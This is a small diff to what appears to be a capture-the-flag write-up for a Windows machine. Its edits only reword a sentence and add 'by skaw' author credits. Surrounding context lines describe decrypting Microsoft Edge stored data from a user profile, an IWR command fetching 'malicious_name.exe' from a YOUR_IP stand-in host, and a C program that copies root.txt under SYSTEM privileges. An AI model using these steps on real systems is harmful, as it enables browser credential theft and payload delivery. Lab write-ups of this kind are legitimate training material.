@@ -209,11 +209,14 @@ so after research the appdata of microsoft edge data is being by deafault here
 "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default"
 ```
 
-so as we web user we can decrypt the data anyways i make the ai created the decrypt code
+so as we web user we can decrypt the data anyways i maked the decrypt code
 
 i stuck in this point i cant download for example from server to the web app is always says acsses denied and powershell the same so no soultion except using echo to create a file
 
 thats code decrypt the (aes 256 crypt)
+
+
+by skaw
 
 ```
 echo import os # to make actions on system > edge_decrypt.py
@@ -439,7 +442,7 @@ IWR -Uri http://YOUR_IP:8000/malicious_name.exe -OutFile C:\temp\malicious_name.
 > i tired making reverse shell program but its failed with me it may the server block it so we can just copy our flag root to ours current directory this c code when it runs with system privilege will copy to us root.txt from Administrator user to any directory we want
 
 - lets make a simple c code doing that
-
+by skaw
 ```
 #include <windows.h>
 #include <stdio.h>
